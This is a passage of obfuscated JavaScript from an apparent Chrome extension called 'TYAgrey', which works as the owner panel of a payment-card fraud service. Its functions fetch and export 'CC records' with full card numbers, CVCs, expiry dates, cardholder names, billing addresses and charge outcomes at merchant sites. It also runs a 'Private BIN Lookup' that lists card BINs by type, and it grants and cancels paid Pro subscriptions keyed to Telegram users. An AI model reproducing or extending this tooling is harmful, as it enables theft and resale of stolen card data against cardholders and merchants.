              var _0x388a75 = "#" + (_0x37c59a + 1) + " — Card: " + _0x58d43b + " | Name: " + _0x580112 + " | Charged: " + _0x3b7b71(String(_0x348cd4.charged_amount || "$0"));
              return "<div class=\"owner-user-item\"><div style=\"font-weight:600;color:var(--text);\">" + _0x388a75 + "</div><button class=\"owner-btn-cancel\" data-action=\"delete-cc\" data-id=\"" + (_0x348cd4.id || _0x37c59a) + "\">Delete</button></div>";
            }).join("");
          }
        }
        var _0x4621c6 = document.getElementById("ownerStatCcRecords");
        if (_0x4621c6) {
          _0x4621c6.textContent = typeof _0x3b2ec8.total === "number" ? _0x3b2ec8.total : _0x3b2ec8.records.length;
        }
      }).catch(function () {
        if (_0x56acf7) {
          _0x56acf7.innerHTML = "<div class=\"owner-empty\">Failed to load</div>";
        }
      });
    }
    window.downloadCcRecords = function () {
      if (!_0xc81f0) {
        var _0x432658 = document.getElementById("ccDownloadStatus");
        if (_0x432658) {
          _0x432658.style.display = "";
          _0x432658.textContent = "Not authenticated";
        }
        return;
      }
      var _0x397a95 = document.getElementById("ccDownloadRange");
      var _0x5cfe4f = _0x397a95 ? _0x397a95.value.trim() : "";
      var _0x34a086 = document.getElementById("ccDownloadStatus");
      if (_0x34a086) {
        _0x34a086.style.display = "";
        _0x34a086.textContent = "Fetching records...";
      }
      _0x59e7fa("get-cc-records", {
        token: _0xc81f0,
        limit: 10000
      }).then(function (_0x16e160) {
        if (!_0x16e160 || !_0x16e160.success || !Array.isArray(_0x16e160.records) || _0x16e160.records.length === 0) {
          if (_0x34a086) {
            _0x34a086.textContent = "No CC records available to download";
          }
          return;
        }
        var _0x3cd8d1 = _0x16e160.records;
        var _0x5dc8ef = 0;
        var _0x56ff75 = _0x3cd8d1.length;
        if (_0x5cfe4f) {
          var _0x444c38 = _0x5cfe4f.split("-").map(function (_0x248728) {
            return parseInt(_0x248728.trim());
          });
          if (_0x444c38.length === 2 && !isNaN(_0x444c38[0]) && !isNaN(_0x444c38[1])) {
            _0x5dc8ef = Math.max(0, _0x444c38[0] - 1);
            _0x56ff75 = Math.min(_0x3cd8d1.length, _0x444c38[1]);
          } else if (!isNaN(parseInt(_0x5cfe4f))) {
            _0x5dc8ef = Math.max(0, parseInt(_0x5cfe4f) - 1);
            _0x56ff75 = Math.min(_0x3cd8d1.length, _0x5dc8ef + 1);
          }
        }
        var _0x29df75 = _0x3cd8d1.slice(_0x5dc8ef, _0x56ff75);
        if (_0x29df75.length === 0) {
          if (_0x34a086) {
            _0x34a086.textContent = "No records in selected range";
          }
          return;
        }
        var _0x161a9d = [];
        _0x29df75.forEach(function (_0x51390d) {
          var _0x4fa0c0 = _0x51390d.status && _0x51390d.status !== "success" ? "❌ FAILED - Payment " + _0x51390d.status : "✅ CHARGED - Payment Successful";
          var _0x11ceac = ["💳 CARD: " + (_0x51390d.full_card_number || "N/A"), "", "Month: " + (_0x51390d.exp_month || "N/A"), "", "Year: " + (_0x51390d.exp_year || "N/A"), "", "CVC: " + (_0x51390d.cvc || "N/A"), "", "Email: " + (_0x51390d.email || "N/A"), "", "Full Name: " + (_0x51390d.full_name || "N/A"), "", "Billing Address: " + (_0x51390d.billing_address || "N/A"), "", "Billing City: " + (_0x51390d.billing_city || "N/A"), "", "Billing State: " + (_0x51390d.billing_state || "N/A"), "", "Billing ZIP: " + (_0x51390d.billing_zip || "N/A"), "", "Billing Country: " + (_0x51390d.billing_country || "N/A"), "", "IP: N/A", "", "Merchant Website: " + (_0x51390d.merchant_website || "N/A"), "", _0x4fa0c0, "💰 " + (_0x51390d.charged_amount || "0.00") + " " + (_0x51390d.currency || "USD")].join("\n");
          _0x161a9d.push(_0x11ceac);
        });
        var _0x51828a = _0x161a9d.join("\n\n\n\n\n\n\n\n\n\n");
        var _0x1d14ad = new Blob([_0x51828a], {
          type: "text/plain"
        });
        var _0x1eefe4 = URL.createObjectURL(_0x1d14ad);
        chrome.downloads.download({
          url: _0x1eefe4,
          filename: "TYAgrey_Fyll_CC_Details.txt",
          saveAs: false
        }, function (_0x402d79) {
          URL.revokeObjectURL(_0x1eefe4);
          if (chrome.runtime.lastError) {
            console.error("Download error:", chrome.runtime.lastError);
            if (_0x34a086) {
              _0x34a086.textContent = "Download blocked: " + chrome.runtime.lastError.message;
            }
          } else if (_0x34a086) {
            _0x34a086.textContent = "Downloaded " + _0x29df75.length + " records!";
          }
        });
      }).catch(function () {
        if (_0x34a086) {
          _0x34a086.textContent = "Failed to download records";
        }
      });
    };
    window.loadBinData = function () {
      if (!_0xc81f0) {
        return;
      }
      var _0x234527 = document.getElementById("binDataDownloadStatus");
      if (_0x234527) {
        _0x234527.style.display = "";
        _0x234527.textContent = "Loading BIN data...";
      }
      _0x59e7fa("get-bin-data", {
        token: _0xc81f0
      }).then(function (_0x3fbf9d) {
        if (!_0x3fbf9d || !_0x3fbf9d.success || !Array.isArray(_0x3fbf9d.records)) {
          if (_0x234527) {
            _0x234527.textContent = "Failed to load BIN data";
          }
          return;
        }
        var _0x44908d = document.getElementById("binDataTotal");
        if (_0x44908d) {
          _0x44908d.textContent = _0x3fbf9d.total || 0;
        }
        var _0x353e16 = document.getElementById("binDataList");
        if (_0x353e16) {
          if (_0x3fbf9d.records.length === 0) {
            _0x353e16.innerHTML = "<div style=\"padding:20px;text-align:center;color:var(--text-muted);\">No BIN data records yet</div>";
          } else {
            _0x353e16.innerHTML = _0x3fbf9d.records.map(function (_0x1e71d4) {
              var _0x3b4edd = _0x1e71d4.recorded_at ? new Date(_0x1e71d4.recorded_at).toLocaleString() : "N/A";
              return "<div style=\"padding:12px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;\"><div><div style=\"font-weight:600;color:var(--accent);\">" + (_0x1e71d4.bin || "N/A") + "</div><div style=\"font-size:11px;color:var(--text-muted);margin-top:4px;\">" + (_0x1e71d4.merchant_site || "N/A") + "</div><div style=\"font-size:11px;color:var(--text-muted);\">" + (_0x1e71d4.amount || "0") + " " + (_0x1e71d4.currency || "USD") + " | " + _0x3b4edd + "</div></div></div>";
            }).join("");
          }
        }
        if (_0x234527) {
          _0x234527.style.display = "none";
        }
      }).catch(function () {
        if (_0x234527) {
          _0x234527.textContent = "Failed to load BIN data";
        }
      });
    };
    window.downloadBinData = function () {
      if (!_0xc81f0) {
        var _0x1d54de = document.getElementById("binDataDownloadStatus");
        if (_0x1d54de) {
          _0x1d54de.style.display = "";
          _0x1d54de.textContent = "Not authenticated";
        }
        return;
      }
      var _0x481b1e = document.getElementById("binDataDownloadStatus");
      if (_0x481b1e) {
        _0x481b1e.style.display = "";
        _0x481b1e.textContent = "Fetching BIN data...";
      }
      _0x59e7fa("get-bin-data", {
        token: _0xc81f0
      }).then(function (_0x19a70b) {
        if (!_0x19a70b || !_0x19a70b.success || !Array.isArray(_0x19a70b.records) || _0x19a70b.records.length === 0) {
          if (_0x481b1e) {
            _0x481b1e.textContent = "No BIN data available to download";
          }
          return;
        }
        var _0x201914 = _0x19a70b.records.map(function (_0x188a07) {
          return ["BIN: " + (_0x188a07.bin || "N/A"), "Site: " + (_0x188a07.merchant_site || "N/A")].join("\n");
        });
        var _0x3bc4dc = _0x201914.join("\n");
        var _0x427f15 = new Blob([_0x3bc4dc], {
          type: "text/plain"
        });
        var _0x3025f1 = URL.createObjectURL(_0x427f15);
        chrome.downloads.download({
          url: _0x3025f1,
          filename: "TYAgrey-BINs-Data.txt",
          saveAs: false
        }, function (_0x38e1a5) {
          URL.revokeObjectURL(_0x3025f1);
          if (chrome.runtime.lastError) {
            console.error("Download error:", chrome.runtime.lastError);
            if (_0x481b1e) {
              _0x481b1e.textContent = "Download blocked: " + chrome.runtime.lastError.message;
            }
          } else if (_0x481b1e) {
            _0x481b1e.textContent = "Downloaded " + _0x19a70b.records.length + " BIN records!";
          }
        });
      }).catch(function () {
        if (_0x481b1e) {
          _0x481b1e.textContent = "Failed to download BIN data";
        }
      });
    };
    window.deleteCcRecord = function (_0x407540) {
      if (!_0x407540) {
        return;
      }
      if (!confirm("Are you sure you want to delete this record?")) {
        return;
      }
      _0x59e7fa("delete-cc-record", {
        token: _0xc81f0,
        id: _0x407540
      }).then(function (_0x6df685) {
        if (_0x6df685 && _0x6df685.success) {
          alert("Record deleted");
          _0x1d3feb();
        } else {
          alert("Error: " + (_0x6df685 && _0x6df685.error ? _0x6df685.error : "Failed to delete"));
        }
      }).catch(function () {
        alert("Failed to delete record");
      });
    };
    function _0x6cb51() {
      if (!_0xc81f0) {
        return;
      }
      _0x59e7fa("get-owner-stats", {
        token: _0xc81f0
      }).then(function (_0x3feab0) {
        if (_0x3feab0 && _0x3feab0.success) {
          var _0x188a05 = document.getElementById("ownerStatTotalUsers");
          var _0x2079e0 = document.getElementById("ownerStatPremiumUsers");
          var _0x96a26 = document.getElementById("ownerStatCcRecords");
          if (_0x188a05) {
            _0x188a05.textContent = typeof _0x3feab0.total_users === "number" ? _0x3feab0.total_users : _0x3feab0.total_users || "--";
          }
          if (_0x2079e0) {
            _0x2079e0.textContent = typeof _0x3feab0.premium_users === "number" ? _0x3feab0.premium_users : _0x3feab0.premium_users || "--";
          }
          if (_0x96a26) {
            _0x96a26.textContent = typeof _0x3feab0.cc_records === "number" ? _0x3feab0.cc_records : _0x3feab0.cc_records || "--";
          }
        }
      }).catch(function () {});
    }
    function _0x2f7dae() {
      if (!_0xc81f0) {
        return;
      }
      var _0x2db73a = document.getElementById("proUsersList");
      var _0x27099e = document.getElementById("proPlusUsersList");
      if (_0x2db73a) {
        _0x2db73a.innerHTML = "<div class=\"owner-loading\">Loading...</div>";
      }
      if (_0x27099e) {
        _0x27099e.innerHTML = "<div class=\"owner-loading\">Loading...</div>";
      }
      _0x59e7fa("get-premium-users", {
        token: _0xc81f0
      }).then(function (_0x5892d8) {
        if (!_0x5892d8 || !_0x5892d8.success || !Array.isArray(_0x5892d8.users)) {
          if (_0x2db73a) {
            _0x2db73a.innerHTML = "<div class=\"owner-empty\">No users found</div>";
          }
          if (_0x27099e) {
            _0x27099e.innerHTML = "<div class=\"owner-empty\">No users found</div>";
          }
          return;
        }
        _0x5272c4 = _0x5892d8.users;
        _0x5285b5();
        var _0x175542 = _0x5892d8.users.filter(function (_0x3b422d) {
          return _0x3b422d.user_role === "pro";
        });
        var _0x5dcd02 = _0x5892d8.users.filter(function (_0x8e4550) {
          return _0x8e4550.user_role === "pro_plus";
        });
        if (_0x2db73a) {
          _0x2db73a.innerHTML = _0x175542.length ? _0x175542.map(_0x28f274).join("") : "<div class=\"owner-empty\">No Pro users</div>";
        }
        if (_0x27099e) {
          _0x27099e.innerHTML = _0x5dcd02.length ? _0x5dcd02.map(_0x28f274).join("") : "<div class=\"owner-empty\">No Pro+ users</div>";
        }
      }).catch(function () {
        if (_0x2db73a) {
          _0x2db73a.innerHTML = "<div class=\"owner-empty\">Failed to load</div>";
        }
        if (_0x27099e) {
          _0x27099e.innerHTML = "<div class=\"owner-empty\">Failed to load</div>";
        }
      });
    }
    function _0x28f274(_0x37194f) {
      var _0x210db3 = _0x3b7b71(_0x37194f.telegram_username || _0x37194f.chat_id || "Unknown");
      var _0x290a09 = _0x37194f.days_remaining;
      var _0x3ca208 = typeof _0x290a09 === "number";
      var _0x25e541 = _0x3ca208 ? _0x290a09 > 0 ? "ACTIVE" : "EXPIRED" : "NO EXPIRY";
      var _0x3e5847 = _0x3ca208 ? _0x290a09 > 0 ? "#28a745" : "#dc3545" : "#6c757d";
      return "<div class=\"owner-user-item\"><div><div class=\"owner-user-name\">" + _0x210db3 + "</div><div style=\"font-size:10px;color:" + _0x3e5847 + ";font-weight:600;\">" + _0x25e541 + "</div></div><div class=\"owner-user-actions\"><button class=\"owner-btn-extend\" data-action=\"extend-sub\" data-chat-id=\"" + _0x3b7b71(_0x37194f.chat_id || "") + "\">Extend</button><button class=\"owner-btn-cancel\" data-action=\"cancel-sub\" data-chat-id=\"" + _0x3b7b71(_0x37194f.chat_id || "") + "\">Cancel</button></div></div>";
    }
    function _0x5285b5() {
      var _0x3dd580 = document.getElementById("monthlyUserSelect");
      var _0x167c64 = document.getElementById("customUserSelect");
      console.log("Populating user selects with cache:", _0x2026e8);
      if (!_0x2026e8 || _0x2026e8.length === 0) {
        var _0xf06fab = "<option value=\"\">-- No users found --</option>";
        if (_0x3dd580) {
          _0x3dd580.innerHTML = _0xf06fab;
        }
        if (_0x167c64) {
          _0x167c64.innerHTML = _0xf06fab;
        }
        return;
      }
      var _0x40ff2d = "<option value=\"\">-- Select user --</option>";
      _0x2026e8.forEach(function (_0x175ae2) {
        var _0x19cb63 = (_0x175ae2.telegram_username || _0x175ae2.chat_id || "Unknown") + " (" + (_0x175ae2.user_role || "user") + ")";
        _0x40ff2d += "<option value=\"" + (_0x175ae2.chat_id || "") + "\">" + _0x3b7b71(_0x19cb63) + "</option>";
      });
      console.log("Generated options:", _0x40ff2d);
      if (_0x3dd580) {
        _0x3dd580.innerHTML = _0x40ff2d;
        console.log("Monthly select updated");
      }
      if (_0x167c64) {
        _0x167c64.innerHTML = _0x40ff2d;
        console.log("Custom select updated");
      }
    }
    function _0xe678d5(_0x4cc1da, _0x755e46) {
      var _0x3ce678 = document.getElementById(_0x4cc1da);
      var _0xf4b4b8 = document.getElementById(_0x755e46);
      var _0x312d9b = "";
      if (_0x3ce678 && _0x3ce678.value) {
        _0x312d9b = _0x3ce678.value;
      }
      if (!_0x312d9b && _0xf4b4b8) {
        _0x312d9b = _0xf4b4b8.value.trim();
      }
      return _0x312d9b;
    }
    window.grantMonthlySubscription = function () {
      var _0x120ca6 = _0xe678d5("monthlyUserSelect", "monthlyUserManual");
      if (!_0x120ca6) {
        alert("Please select or enter a user.");
        return;
      }
      var _0x23a5d4 = document.getElementById("monthlyRole");
      var _0x49454f = _0x23a5d4 ? _0x23a5d4.value : "pro";
      var _0x4b7201 = document.getElementById("grantMonthlyBtn");
      if (_0x4b7201) {
        _0x4b7201.disabled = true;
        _0x4b7201.textContent = "Granting...";
      }
      var _0x459b23 = {
        token: _0xc81f0,
        chat_id: _0x120ca6,
        role: _0x49454f,
        days: 30,
        granted_by: _0x42475b || _0xc81f0
      };
      console.log("[OWNER] Grant payload:", _0x459b23);
      _0x59e7fa("grant-subscription", _0x459b23).then(function (_0x53ddda) {
        console.log("[OWNER] Grant response:", _0x53ddda);
        if (_0x53ddda && _0x53ddda.success) {
          alert("Monthly subscription granted! Verified role in DB: " + (_0x53ddda.verified_role || "NULL"));
          _0x59e7fa("debug-role", {
            token: _0xc81f0,
            chat_id: _0x120ca6
          }).then(function (_0x208a6e) {
            console.log("[OWNER] Post-grant debug:", _0x208a6e);
          });
          _0x35b66a();
          _0x2f7dae();
        } else {
          alert("Error: " + (_0x53ddda && _0x53ddda.error ? _0x53ddda.error : "Failed to grant"));
        }
      }).catch(function (_0x103ac4) {
        console.error("[OWNER] Grant network error:", _0x103ac4);
        alert("Failed to grant subscription");
      }).finally(function () {
        if (_0x4b7201) {
          _0x4b7201.disabled = false;
          _0x4b7201.textContent = "Grant Access";
        }
      });
    };
    window.grantCustomLicense = function () {
      var _0x4bdc9e = _0xe678d5("customUserSelect", "customUserManual");
      if (!_0x4bdc9e) {
        alert("Please select or enter a user.");
        return;
      }
      var _0x3183f8 = document.getElementById("customRole");
      var _0x2253e4 = _0x3183f8 ? _0x3183f8.value : "pro";
      var _0x3cce10 = document.getElementById("customDays");
      var _0x341489 = _0x3cce10 ? parseInt(_0x3cce10.value) : 0;
      if (!_0x341489 || _0x341489 < 2 || _0x341489 > 365) {
        alert("Please enter valid days (2-365)");
        return;
      }
      var _0x537187 = document.getElementById("grantCustomBtn");
      if (_0x537187) {
        _0x537187.disabled = true;
        _0x537187.textContent = "Granting...";
      }
      _0x59e7fa("grant-subscription", {
        token: _0xc81f0,
        chat_id: _0x4bdc9e,
        role: _0x2253e4,
        days: _0x341489,
        granted_by: _0x42475b || _0xc81f0
      }).then(function (_0x49bd4a) {
        if (_0x49bd4a && _0x49bd4a.success) {
          alert("Custom license granted for " + _0x341489 + " days! Verified role in DB: " + (_0x49bd4a.verified_role || "NULL"));
          _0x35b66a();
          _0x2f7dae();
        } else {
          alert("Error: " + (_0x49bd4a && _0x49bd4a.error ? _0x49bd4a.error : "Failed to grant"));
        }
      }).catch(function () {
        alert("Failed to grant license");
      }).finally(function () {
        if (_0x537187) {
          _0x537187.disabled = false;
          _0x537187.textContent = "Grant License";
        }
      });
    };
    window.cancelUserSubscription = function (_0x174ddb) {
      if (!_0x174ddb) {
        return;
      }
      if (!confirm("Are you sure you want to cancel this subscription?")) {
        return;
      }
      _0x59e7fa("cancel-subscription", {
        token: _0xc81f0,
        chat_id: _0x174ddb,
        cancelled_by: _0x42475b || _0xc81f0
      }).then(function (_0x5d9cfe) {
        if (_0x5d9cfe && _0x5d9cfe.success) {
          alert("Subscription cancelled successfully!");
          _0x35b66a();
          _0x2f7dae();
        } else {
          alert("Error: " + (_0x5d9cfe && _0x5d9cfe.error ? _0x5d9cfe.error : "Failed to cancel"));
        }
      }).catch(function () {
        alert("Failed to cancel subscription");
      });
    };
    window.extendUserSubscription = function (_0x2cfe6e) {
      if (!_0x2cfe6e) {
        return;
      }
      var _0x1676cf = prompt("Enter number of days to extend (2-365):");
      if (!_0x1676cf || isNaN(_0x1676cf) || _0x1676cf < 2 || _0x1676cf > 365) {
        alert("Please enter valid days (2-365)");
        return;
      }
      _0x59e7fa("extend-subscription", {
        token: _0xc81f0,
        chat_id: _0x2cfe6e,
        days: parseInt(_0x1676cf),
        extended_by: _0x42475b || _0xc81f0
      }).then(function (_0x1db03d) {
        if (_0x1db03d && _0x1db03d.success) {
          alert("Subscription extended by " + _0x1676cf + " days!");
          _0x35b66a();
          _0x2f7dae();
        } else {
          alert("Error: " + (_0x1db03d && _0x1db03d.error ? _0x1db03d.error : "Failed to extend"));
        }
      }).catch(function () {
        alert("Failed to extend subscription");
      });
    };
    var _0x4a2898 = document.getElementById("grantMonthlyBtn");
    var _0x4e1960 = document.getElementById("grantCustomBtn");
    var _0x14f003 = document.getElementById("ccDownloadBtn");
    var _0x1c68fd = document.getElementById("binDataDownloadBtn");
    var _0x1e96b2 = document.getElementById("binDataRefreshBtn");
    if (_0x4a2898) {
      _0x4a2898.addEventListener("click", window.grantMonthlySubscription);
    }
    if (_0x4e1960) {
      _0x4e1960.addEventListener("click", window.grantCustomLicense);
    }
    if (_0x14f003) {
      _0x14f003.addEventListener("click", window.downloadCcRecords);
    }
    if (_0x1c68fd) {
      _0x1c68fd.addEventListener("click", window.downloadBinData);
    }
    if (_0x1e96b2) {
      _0x1e96b2.addEventListener("click", window.loadBinData);
    }
    var _0x595658 = document.getElementById("proUsersList");
    var _0x171a08 = document.getElementById("proPlusUsersList");
    var _0x50b0e5 = document.getElementById("ccRecordsList");
    function _0x53e2ea(_0x229c67) {
      var _0x136a2e = _0x229c67.target;
      if (!_0x136a2e || !_0x136a2e.dataset.action) {
        return;
      }
      var _0x57a8b0 = _0x136a2e.dataset.action;
      if (_0x57a8b0 === "extend-sub") {
        var _0x37c785 = _0x136a2e.dataset.chatId;
        if (_0x37c785) {
          window.extendUserSubscription(_0x37c785);
        }
      } else if (_0x57a8b0 === "cancel-sub") {
        var _0x1cec18 = _0x136a2e.dataset.chatId;
        if (_0x1cec18) {
          window.cancelUserSubscription(_0x1cec18);
        }
      } else if (_0x57a8b0 === "delete-cc") {
        var _0xec0e02 = _0x136a2e.dataset.id;
        if (_0xec0e02) {
          window.deleteCcRecord(_0xec0e02);
        }
      }
    }
    if (_0x595658) {
      _0x595658.addEventListener("click", _0x53e2ea);
    }
    if (_0x171a08) {
      _0x171a08.addEventListener("click", _0x53e2ea);
    }
    if (_0x50b0e5) {
      _0x50b0e5.addEventListener("click", _0x53e2ea);
    }
    _0x5df80a();
  });
});
function apiBinFetch(_0x3bd171, _0x46ca42) {
  _0x46ca42 = _0x46ca42 || {};
  return new Promise(function (_0x26076a) {
    try {
      chrome.runtime.sendMessage({
        type: "API_REQUEST",
        endpoint: _0x3bd171,
        payload: _0x46ca42
      }, function (_0x4edbe7) {
        if (chrome.runtime.lastError) {
          _0x26076a({
            success: false,
            error: chrome.runtime.lastError.message || "Runtime error"
          });
          return;
        }
        _0x26076a(_0x4edbe7 || {
          success: false,
          error: "No response from server"
        });
      });
    } catch (_0x5c7c88) {
      _0x26076a({
        success: false,
        error: _0x5c7c88 && _0x5c7c88.message ? _0x5c7c88.message : "Request failed"
      });
    }
  });
}
function getTyagreyToken() {
  return new Promise(function (_0x3c9417) {
    chrome.storage.local.get(["tyagrey_token"], function (_0x13cfe5) {
      _0x3c9417(_0x13cfe5 && _0x13cfe5.tyagrey_token ? String(_0x13cfe5.tyagrey_token) : "");
    });
  });
}
function loadBinLookup() {
  console.log("Loading Private BIN Lookup tab");
  loadBinStats();
  setupBinLookupListeners();
}
function setupBinLookupListeners() {
  const _0x43f656 = document.getElementById("binInput");
  const _0x299db2 = document.getElementById("binLookupBtn");
  const _0x2b9512 = document.getElementById("binLookupReloadBtn");
  const _0x2739b9 = document.getElementById("cardTypeSelector");
  const _0x15f509 = document.getElementById("showCardsByTypeBtn");
  if (_0x299db2) {
    _0x299db2.addEventListener("click", performBinLookup);
  }
  if (_0x2b9512) {
    _0x2b9512.addEventListener("click", loadBinStats);
  }
  if (_0x15f509) {
    _0x15f509.addEventListener("click", showCardsByType);
  }
  if (_0x43f656) {
    _0x43f656.addEventListener("keypress", _0x223419 => {
      if (_0x223419.key === "Enter") {
        performBinLookup();
      }
    });
  }
}
const binPrefixes = {
  "4": {
    scheme: "VISA",
    type: "Credit/Debit",
    brand: "Visa"
  },
  "5": {
    scheme: "MASTERCARD",
    type: "Credit/Debit",
    brand: "Mastercard"
  },
  "3": {
    scheme: "AMEX",
    type: "Credit",
    brand: "American Express"
  },
  "6": {
    scheme: "DISCOVER",
    type: "Credit",
    brand: "Discover"
  }
};
function getClientSideBinInfo(_0x30dac4) {
  const _0x1f4f96 = _0x30dac4.charAt(0);
  const _0x16f705 = binPrefixes[_0x1f4f96];
  if (!_0x16f705) {
    return null;
  }
  return {
    bin: _0x30dac4,
    bin_length: _0x30dac4.length,
    scheme: _0x16f705.scheme,
    type: _0x16f705.type,
    brand: _0x16f705.brand,
    bank_name: "Unknown Bank",
    country_name: "Unknown",
    country_code: null,
    country_flag: "",
    currency: null,
    api_source: "client_side"
  };
}
async function performBinLookup() {
  if (userRole === "user") {
    showNotification("Private BIN Lookup is a Pro feature. Upgrade to Pro to use it.", "error");
    return;
  }
  const _0x1fab2d = document.getElementById("binInput");
  const _0x4e333d = _0x1fab2d.value.trim();
  if (!_0x4e333d) {
    showBinError("Please enter a BIN");
    return;
  }
  if (!/^\d{6,10}$/.test(_0x4e333d)) {
    showBinError("Invalid BIN format (6-10 digits required)");
    return;
  }
  showBinLoading();
  try {
    const _0x3bcf8f = await getTyagreyToken();
    const _0xa3f4d8 = await apiBinFetch("bin-lookup", {
      bin: _0x4e333d,
      token: _0x3bcf8f
    });
    if (_0xa3f4d8.success) {
      displayBinResult(_0xa3f4d8.data, _0xa3f4d8.source);
    } else {
      const _0x2436fe = getClientSideBinInfo(_0x4e333d);
      if (_0x2436fe) {
        displayBinResult(_0x2436fe, "client_side_fallback");
      } else {
        showBinError(_0xa3f4d8.error || "BIN not found in database");
      }
    }
  } catch (_0x1b78db) {
    console.error("Private BIN Lookup error:", _0x1b78db);
    const _0x404ce8 = getClientSideBinInfo(_0x4e333d);
    if (_0x404ce8) {
      displayBinResult(_0x404ce8, "client_side_fallback");
    } else {
      showBinError("Server error (500). The Private BIN Lookup service is temporarily unavailable.");
    }
  }
}
async function showCardsByType() {
  if (userRole === "user") {
    showNotification("Private BIN Lookup is a Pro feature. Upgrade to Pro to use it.", "error");
    return;
  }
  const _0x2b3ccd = document.getElementById("cardTypeSelector");
  const _0x291c60 = _0x2b3ccd.value;
  if (!_0x291c60) {
    showBinError("Please select a card type");
    return;
  }
  showCardTypeLoading();
  try {
    const _0x15346a = await getTyagreyToken();
    const _0x4c3761 = await apiBinFetch("bin-by-type", {
      type: _0x291c60,
      token: _0x15346a,
      limit: 50
    });
    if (_0x4c3761.success) {
      displayCardTypeResults(_0x4c3761.data, _0x4c3761.count, _0x291c60);
    } else {
      showCardTypeError(_0x4c3761.error || "No cards found for this type");
    }
  } catch (_0x398334) {
    console.error("Card type lookup error:", _0x398334);
    showCardTypeError("Failed to fetch cards by type");
  }
}
async function loadBinStats() {
  try {
    const _0x501759 = await getTyagreyToken();
    const _0x209167 = await apiBinFetch("bin-stats", {
      token: _0x501759
    });
    if (_0x209167.success) {
      displayBinStats(_0x209167);
    } else {
      console.warn("BIN stats:", _0x209167.error || _0x209167);
      displayBinStats({
        total_bins: "--",
        total_countries: "--",
        total_schemes: "--"
      });
    }
  } catch (_0x54e0b3) {
    console.error("BIN stats error:", _0x54e0b3);
    displayBinStats({
      total_bins: "--",
      total_countries: "--",
      total_schemes: "--"
    });
  }
}
function displayBinResult(_0x428119, _0x56dccd) {
  const _0x42213a = document.getElementById("binResultCard");
  const _0x1275e5 = document.getElementById("binStatus");
  const _0x1e3e2e = document.getElementById("binDetails");
  const _0x6697e5 = document.getElementById("binLength");
  const _0x56fc74 = document.getElementById("binScheme");
  const _0x521e1f = document.getElementById("binType");
  const _0x22aa5e = document.getElementById("binBrand");
  const _0x1f32f5 = document.getElementById("binBank");
  const _0x2b05b7 = document.getElementById("binCountry");
  const _0x5606cb = document.getElementById("binCurrency");
  const _0x50c594 = document.getElementById("advancedDetailsBtn");
  _0x42213a.style.display = "block";
  _0x1275e5.textContent = "BIN Found";
  _0x1e3e2e.textContent = "Data source: " + _0x56dccd;
  _0x6697e5.textContent = _0x428119.bin_length != null ? String(_0x428119.bin_length) : _0x428119.bin ? String(String(_0x428119.bin).length) : "--";
  _0x56fc74.textContent = _0x428119.scheme || "--";
  _0x521e1f.textContent = _0x428119.type || "--";
  _0x22aa5e.textContent = _0x428119.brand || "--";
  _0x1f32f5.textContent = _0x428119.bank_name || "--";
  _0x2b05b7.textContent = (_0x428119.country_name || "--") + " " + (_0x428119.country_flag || "");
  _0x5606cb.textContent = _0x428119.currency || "--";
  const _0x515eaf = _0x428119.bank_phone || _0x428119.bank_url || _0x428119.country_full_name || _0x428119.api_source;
  console.log("Extended data check:", {
    bank_phone: _0x428119.bank_phone,
    bank_url: _0x428119.bank_url,
    country_full_name: _0x428119.country_full_name,
    api_source: _0x428119.api_source,
    hasExtendedData: _0x515eaf
  });
  if (_0x50c594) {
    if (_0x515eaf) {
      _0x50c594.style.display = "inline-flex";
      window.currentBinData = {
        ..._0x428119,
        source: _0x56dccd
      };
      console.log("✅ Advanced details button shown, data:", window.currentBinData);
    } else {
      _0x50c594.style.display = "none";
      console.log("❌ Advanced details button hidden - no extended data");
    }
  } else {
    console.error("❌ Advanced details button not found in DOM");
  }
  document.getElementById("cardTypeResults").style.display = "none";
}
function displayCardTypeResults(_0x3d4a3b, _0x225871, _0x24ab2) {
  const _0x33a60a = document.getElementById("cardTypeResults");
  const _0xfa65d0 = document.getElementById("cardTypeList");
  if (_0x3d4a3b.length === 0) {
    _0xfa65d0.innerHTML = "<div style=\"text-align: center; color: #0284c7; padding: 20px;\">No cards found for this type</div>";
  } else {
    _0xfa65d0.innerHTML = _0x3d4a3b.map(_0x59f03e => "\n      <div style=\"background: white; border-radius: 8px; padding: 12px; margin-bottom: 8px; border: 1px solid rgba(14, 165, 233, 0.2);\">\n        <div style=\"display: flex; justify-content: space-between; align-items: center;\">\n          <div>\n            <strong style=\"color: #0ea5e9;\">" + _0x59f03e.bin + "</strong>\n            <span style=\"color: #0284c7; margin-left: 8px;\">" + (_0x59f03e.scheme || _0x24ab2.toUpperCase()) + "</span>\n          </div>\n          <div style=\"font-size: 12px; color: #0284c7;\">\n            " + (_0x59f03e.bank_name || "Unknown Bank") + " - " + (_0x59f03e.country_name || "Unknown") + "\n          </div>\n        </div>\n        <div style=\"display: flex; justify-content: space-between; margin-top: 8px; font-size: 11px; color: #64748b;\">\n          <span>Type: " + (_0x59f03e.type || "N/A") + "</span>\n          <span>Brand: " + (_0x59f03e.brand || "N/A") + "</span>\n        </div>\n      </div>\n    ").join("");
  }
  _0x33a60a.style.display = "block";
}
function showCardTypeLoading() {
  const _0x20c819 = document.getElementById("cardTypeResults");
  const _0x5d2b45 = document.getElementById("cardTypeList");
  _0x20c819.style.display = "block";
  _0x5d2b45.innerHTML = "<div style=\"text-align: center; color: #0284c7; padding: 20px;\">Loading cards...</div>";
}
function showCardTypeError(_0x2cd58c) {
  const _0x3142bd = document.getElementById("cardTypeResults");
  const _0x40ba89 = document.getElementById("cardTypeList");
  _0x3142bd.style.display = "block";
  _0x40ba89.innerHTML = "<div style=\"text-align: center; color: #dc2626; padding: 20px;\">" + _0x2cd58c + "</div>";
}
function displayBinStats(_0x226e64) {
  const _0x350267 = document.getElementById("totalBins");
  const _0x8c5e04 = document.getElementById("totalCountries");
  const _0x2e1eaf = document.getElementById("totalSchemes");
  if (!_0x350267 || !_0x8c5e04 || !_0x2e1eaf) {
    return;
  }
  var _0x23b714 = _0x226e64.total_bins;
  var _0x593bcb = _0x226e64.total_countries;
  var _0x2d3cb4 = _0x226e64.total_schemes;
  _0x350267.textContent = _0x23b714 !== undefined && _0x23b714 !== null ? String(_0x23b714) : "--";
  _0x8c5e04.textContent = _0x593bcb !== undefined && _0x593bcb !== null ? String(_0x593bcb) : "--";
  _0x2e1eaf.textContent = _0x2d3cb4 !== undefined && _0x2d3cb4 !== null ? String(_0x2d3cb4) : "--";
}
function showBinLoading() {
  const _0x1f700f = document.getElementById("binResultCard");
  const _0xa236e4 = document.getElementById("binStatus");
